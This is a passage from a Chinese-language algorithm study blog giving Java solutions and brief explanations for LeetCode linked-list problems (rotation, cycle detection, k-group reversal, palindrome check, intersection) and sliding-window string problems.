class="line">        <span class="keyword">if</span> (left != <span class="literal">null</span>) &#123;</span><br><span class="line">            rear.next = left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (right != <span class="literal">null</span>) &#123;</span><br><span class="line">            rear.next = right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> prev.next;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="61-旋转链表-x2F"><a href="#61-旋转链表-x2F" class="headerlink" title="61. 旋转链表&#x2F;"></a><a href="https://leetcode-cn.com/problems/rotate-list/">61. 旋转链表</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 双指针</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> ListNode <span class="title function_">rotateRight</span><span class="params">(ListNode head, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">null</span> || k == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> head;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">q</span> <span class="operator">=</span> head;</span><br><span class="line">    <span class="comment">// 计算链表有几个节点并将q指向链表末尾</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (q.next != <span class="literal">null</span>) &#123;</span><br><span class="line">      q = q.next;</span><br><span class="line">      len++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 处理k大于等于len的情况</span></span><br><span class="line">    k = k % len;</span><br><span class="line">    <span class="keyword">if</span> (k == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将p指向倒数第k+1个位置</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; (len - k)) &#123;</span><br><span class="line">      p = p.next;</span><br><span class="line">      i++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">res</span> <span class="operator">=</span> p.next;</span><br><span class="line">    q.next = head;</span><br><span class="line">    p.next = <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="141-环形链表-x2F-x2F-x2F"><a href="#141-环形链表-x2F-x2F-x2F" class="headerlink" title="141. 环形链表&#x2F;&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/linked-list-cycle/">141. 环形链表</a>&#x2F;&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 快慢指针: 这是因为fast是走两步，slow是走一步，其实相对于slow来说，fast是一个节点一个节点的靠近slow的，所以fast一定可以和slow重合。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (fast.next != <span class="literal">null</span> &amp;&amp; fast.next.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            <span class="keyword">if</span> (slow == fast) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="142-环形链表-II-x2F"><a href="#142-环形链表-II-x2F" class="headerlink" title="142. 环形链表 II&#x2F;"></a><a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/">142. 环形链表 II</a>&#x2F;</h3><h4 id="方法一-快慢指针"><a href="#方法一-快慢指针" class="headerlink" title="方法一:快慢指针"></a>方法一:快慢指针</h4><p><img src="/%E7%AE%97%E6%B3%95.assets/2036dfe7e991f00dfb788a9b84a17bb6fac337e81c09bdf57e683d028a6952bc-%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png" alt="未命名文件.png"></p>
<p>相遇时：</p>
<ul>
<li>slow走过的路程：x + y + n(y+z), n代表slow绕了n圈</li>
<li>fast走过的路程：x + y + m(y+z)，m代表fast饶了m圈</li>
<li>m &gt; n</li>
</ul>
<p>因为fast速度是slow两倍：</p>
<ul>
<li>2(x + y + n(y + z)) &#x3D; x + y + m(y + z)</li>
<li>x + y &#x3D; (m - 2n)(y + z)</li>
<li>x &#x3D; (m - 2n)(y + z) - y</li>
<li>y + z就是1圈，假设 o &#x3D; m-2n，o是一个正整数，那么 x &#x3D; o(y + z) -y</li>
<li>如果o &#x3D; 1，那么 x &#x3D; z，和答主假设的情况一样</li>
<li>如果o &gt; 1，那么 x &#x3D; (o-1)(y+z) + y + z - y, x &#x3D; (o-1)(y+z) + z，即x的长度为o-1圈加上z</li>
</ul>
<p>所以，从第一阶段获得的相遇点，走过x距离机会到达环的起点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">detectCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (fast != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            </span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            <span class="keyword">if</span> (slow == fast) &#123;</span><br><span class="line">                fast = head;</span><br><span class="line">                <span class="keyword">while</span> (slow != fast) &#123;</span><br><span class="line">                    slow = slow.next;</span><br><span class="line">                    fast = fast.next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> slow;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="25-K-个一组翻转链表-x2F"><a href="#25-K-个一组翻转链表-x2F" class="headerlink" title="25. K 个一组翻转链表&#x2F;"></a><a href="https://leetcode-cn.com/problems/reverse-nodes-in-k-group/">25. K 个一组翻转链表</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 头插法反转链表</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseKGroup</span><span class="params">(ListNode head, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span> || k &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">            len++;</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummy.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pre</span> <span class="operator">=</span> dummy;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len / k; i++) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; k; j++) &#123;</span><br><span class="line">                tmp = cur.next;</span><br><span class="line">                cur.next = tmp.next;</span><br><span class="line">                tmp.next = pre.next;</span><br><span class="line">                pre.next = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            pre = cur;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="143-重排链表"><a href="#143-重排链表" class="headerlink" title="143. 重排链表"></a><a href="https://leetcode-cn.com/problems/reorder-list">143. 重排链表</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reorderList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">            size++;</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (size &lt; <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> size / <span class="number">2</span>;</span><br><span class="line">        p = head;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mid; i++) &#123;</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> p.next;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (cur.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            tmp = cur.next;</span><br><span class="line">            cur.next = tmp.next;</span><br><span class="line">            tmp.next = p.next;</span><br><span class="line">            p.next = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">q</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (p.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            tmp = p.next;</span><br><span class="line">            p.next = tmp.next;</span><br><span class="line">            tmp.next = q.next;</span><br><span class="line">            q.next = tmp;</span><br><span class="line">            q = tmp.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="92-反转链表-II"><a href="#92-反转链表-II" class="headerlink" title="92. 反转链表 II"></a><a href="https://leetcode-cn.com/problems/reverse-linked-list-ii">92. 反转链表 II</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseBetween</span><span class="params">(ListNode head, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span> || left &gt; right) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        dummy.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pre</span> <span class="operator">=</span> dummy;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; left - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            pre = pre.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> pre.next;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; right - left; i++) &#123;</span><br><span class="line">            tmp = cur.next;</span><br><span class="line">            cur.next = tmp.next;</span><br><span class="line">            tmp.next = pre.next;</span><br><span class="line">            pre.next = tmp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="补充题1-排序奇升偶降链表"><a href="#补充题1-排序奇升偶降链表" class="headerlink" title="补充题1. 排序奇升偶降链表"></a><a href="https://mp.weixin.qq.com/s/377FfqvpY8NwMInhpoDgsw">补充题1. 排序奇升偶降链表</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">sort</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// odd</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="comment">// even</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">q</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        dummy.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tail</span> <span class="operator">=</span> dummy;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span> &amp;&amp; p.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            tmp = p.next;</span><br><span class="line">            p.next = tmp.next;</span><br><span class="line">            p = p.next;</span><br><span class="line"></span><br><span class="line">            tmp.next = dummy.next;</span><br><span class="line">            dummy.next = tmp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        q = dummy.next;</span><br><span class="line">        p = head;</span><br><span class="line">        dummy.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span> &amp;&amp; q != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p.val &lt;= q.val) &#123;</span><br><span class="line">                tail.next = p;</span><br><span class="line">                tail = tail.next;</span><br><span class="line">                p = p.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                tail.next = q;</span><br><span class="line">                tail = tail.next;</span><br><span class="line">                q = q.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">            tail.next = p;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (q != <span class="literal">null</span>) &#123;</span><br><span class="line">            tail.next = q;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-22-链表中倒数第K个节点"><a href="#剑指-Offer-22-链表中倒数第K个节点" class="headerlink" title="剑指 Offer 22. 链表中倒数第K个节点"></a><a href="https://leetcode-cn.com/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof">剑指 Offer 22. 链表中倒数第K个节点</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">getKthFromEnd</span><span class="params">(ListNode head, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || k &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">            count++;</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (k &gt; count) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummy.next = head;</span><br><span class="line"></span><br><span class="line">        p = dummy;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> count - k + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            p = p.next;</span><br><span class="line">            num--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="234-回文链表"><a href="#234-回文链表" class="headerlink" title="234. 回文链表"></a><a href="https://leetcode-cn.com/problems/palindrome-linked-list">234. 回文链表</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 先反转再遍历比较</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isPalindrome</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (fast.next != <span class="literal">null</span> &amp;&amp; fast.next.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> slow.next;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (p.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            temp = p.next;</span><br><span class="line">            p.next = temp.next;</span><br><span class="line">            temp.next = slow.next;</span><br><span class="line">            slow.next = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        p = slow.next;</span><br><span class="line">        slow.next = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (head != <span class="literal">null</span> &amp;&amp; p != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (head.val != p.val) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            head = head.next;</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="160-相交链表"><a href="#160-相交链表" class="headerlink" title="160. 相交链表"></a><a href="https://leetcode-cn.com/problems/intersection-of-two-linked-lists/">160. 相交链表</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (headA == <span class="literal">null</span> || headB == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sizeA</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sizeB</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> headA, q;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">            sizeA++;</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        p = headB;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">            sizeB++;</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        p = headA;</span><br><span class="line">        q = headB;</span><br><span class="line">        <span class="keyword">if</span> (sizeA &gt; sizeB) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> sizeA - sizeB;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">                p = p.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> sizeB - sizeA;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">                q = q.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span> &amp;&amp; q != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p == q) &#123;</span><br><span class="line">                <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">            p = p.next;</span><br><span class="line">            q = q.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h2><h3 id="3-无重复字符的最长子串-x2F-x2F-x2F-x2F"><a href="#3-无重复字符的最长子串-x2F-x2F-x2F-x2F" class="headerlink" title="3. 无重复字符的最长子串&#x2F;&#x2F;&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/longest-substring-without-repeating-characters/">3. 无重复字符的最长子串</a>&#x2F;&#x2F;&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 滑动窗口</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        HashMap&lt;Character, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; sc.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(sc[i])) &#123;</span><br><span class="line">                <span class="comment">// abba这个通过不了</span></span><br><span class="line">                <span class="comment">// left = map.get(charArray[i]); </span></span><br><span class="line">                left = Math.max(left, map.get(sc[i]) + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            map.put(sc[i], i);</span><br><span class="line">            max = Math.max(max, i - left + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="76-最小覆盖子串"><a href="#76-最小覆盖子串" class="headerlink" title="76. 最小覆盖子串"></a><a href="https://leetcode-cn.com/problems/minimum-window-substring/">76. 最小覆盖子串</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 滑动窗口</span></span><br><span class="line"><span class="comment">//一个用于「延伸」现有窗口的r 指针，和一个用于「收缩」窗口的l 指针。在任意时刻，只有一个指针运动，而另一</span></span><br><span class="line"><span class="comment">//个保持静止。我们在 s 上滑动窗口，通过移动 r 指针不断扩张窗口。当窗口包含 t 全部所需的字符后，如果能收</span></span><br><span class="line"><span class="comment">//缩，我们就收缩窗口直到得到最小窗口。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">minWindow</span><span class="params">(String s, String t)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="literal">null</span> || s == <span class="string">&quot;&quot;</span> || t == <span class="literal">null</span> || t == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        <span class="type">char</span>[] tc = t.toCharArray();</span><br><span class="line">        <span class="type">int</span>[] need = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">128</span>];</span><br><span class="line">        <span class="type">int</span>[] have = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">128</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tc.length; i++) &#123;</span><br><span class="line">            need[tc[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>, r = <span class="number">0</span>, count = <span class="number">0</span>, min = sc.length + <span class="number">1</span>, start = l;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (r &lt; sc.length) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> sc[r];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (need[c] == <span class="number">0</span>) &#123;</span><br><span class="line">                r++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (have[c] &lt; need[c]) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">            have[c]++;</span><br><span class="line">            r++;</span><br><span 